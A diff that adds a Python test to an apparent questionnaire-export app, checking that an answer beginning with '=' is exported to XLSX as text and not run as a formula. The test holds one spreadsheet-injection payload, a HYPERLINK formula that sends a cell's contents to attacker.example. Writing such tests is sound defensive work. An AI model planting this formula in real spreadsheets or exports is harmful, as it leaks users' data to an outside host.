@@ -128,3 +128,17 @@ def test_export_in_the_original_format(client, db, qn):
     assert r.headers["content-type"].startswith(DOCX_CT)
     texts = [x.text for x in _docx.Document(BytesIO(r.content)).paragraphs]
     assert any("original was a PDF" in t for t in texts) and "In Azure East US." in " ".join(texts)
+
+
+def test_xlsx_export_writes_a_formula_like_answer_as_text(client, db, qn):
+    """BUG-H03 sweep: openpyxl turns any string starting with = into a formula; an answer is always text."""
+    from openpyxl import load_workbook
+
+    cid, e, maria, people, fake = qn
+    login_as(client, db, maria)
+    q = _upload(client, "Northwind_AI_DDQ.xlsx", _xlsx(), XLSX_CT).json()
+    evil = '=HYPERLINK("https://attacker.example/?d="&C4,"Open")'
+    client.put(f"/api/v1/questionnaires/{q['id']}/items/{q['items'][0]['id']}", json={"answer": evil})
+    ws = load_workbook(BytesIO(client.get(f"/api/v1/questionnaires/{q['id']}/export").content))["AI controls"]
+    c = ws.cell(row=4, column=4)
+    assert c.data_type == "s" and c.value == evil
